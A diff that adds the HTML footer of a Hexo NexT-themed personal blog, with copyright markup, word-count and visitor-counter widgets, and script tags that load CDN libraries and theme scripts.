+<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">TWe1v3</span>
+</div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+      <span>站点总字数：</span>
+    <span title="站点总字数">193k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span>站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">2:56</span>
+  </span>
+</div>
+
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客数:<span id="busuanzi_value_site_uv"></span>
+</span>
+</div>
+
+    </div>
+  </footer>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/9.1.3/mermaid.min.js","integrity":"sha256-TIYL00Rhw/8WaoUhYTLX9SKIEFdXxg+yMWSLVUbhiLg="}}</script>
+  <script src="/js/third-party/tags/mermaid.js"></script>
+
+
+
+  
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">false</script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.16.0/katex.min.css" integrity="sha256-uik/hNqHWZldXh/0K35nqOSCff9F61/ZOFReqNOBgB0=" crossorigin="anonymous">
+  <script class="next-config" data-name="katex" type="application/json">{"copy_tex_js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.16.0/contrib/copy-tex.min.js","integrity":"sha256-Us54+rSGDSTvIhKKUs4kygE2ipA0RXpWWh0/zLqw3bs="}}</script>
+  <script src="/js/third-party/math/katex.js"></script>
+
+
+
+
+<script src="/live2d-widget/autoload.js"></script>
+</body>
+</html>
